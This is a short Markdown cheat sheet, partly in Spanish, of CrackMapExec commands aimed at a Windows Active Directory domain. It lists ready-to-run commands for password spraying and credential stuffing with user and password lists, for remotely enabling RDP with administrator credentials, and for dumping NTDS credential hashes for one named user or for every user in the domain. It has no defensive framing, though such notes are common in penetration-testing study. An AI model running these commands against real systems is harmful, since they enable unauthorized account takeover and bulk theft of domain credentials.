# CrackMapExec

## Enumeration

### Password Spraying

```
crackmapexec smb IP-RANGO -u usuarios.txt -p "Password123" -d deimcorp.local
```

> Este ataque se usa cuando sospechas que varios usuarios pueden estar usando la misma contraseña.

***

## Connecction

### Command execution

```
crackmapexec smb IP_RANGO -u 'Administrador' -p 'P@ssw0rd!' -M rdp -o action=enable
```

> `-M rdp`: Usa el módulo RDP.
>
> `-o ACTION=enable`: Indica la acción a realizar, habilitar **Remote Desktop Protocol (RDP)**.

#### Only One User

```
crackmapexec smb AD_IP -u 'Administrador' -p 'P@ssw0rd!' --ntds vss --user 'victima'
```

#### All Users AD

```
crackmapexec smb AD_IP -u 'Administrador' -p 'P@ssw0rd!' -M ntdsutil
```

***

## Brute Force

### Credential Stuffing

```
crackmapexec smb IP-RANGO -u usuarios.txt -p passwords.txt -d deimcorp.local
```
